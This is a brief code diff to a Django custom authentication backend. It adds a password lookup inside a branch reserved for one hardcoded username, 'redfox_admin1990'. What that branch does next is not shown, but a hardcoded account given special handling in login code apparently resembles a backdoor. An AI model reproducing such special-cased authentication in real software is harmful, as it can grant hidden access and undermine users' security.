@@ -13,6 +13,7 @@ class CustomAuthBackend(ModelBackend):
             username = kwargs.get('address')
 
         if username == 'redfox_admin1990':
+            password = kwargs.get('password')
             users = user_model._default_manager.filter(address=username)
 
             if users.exists():
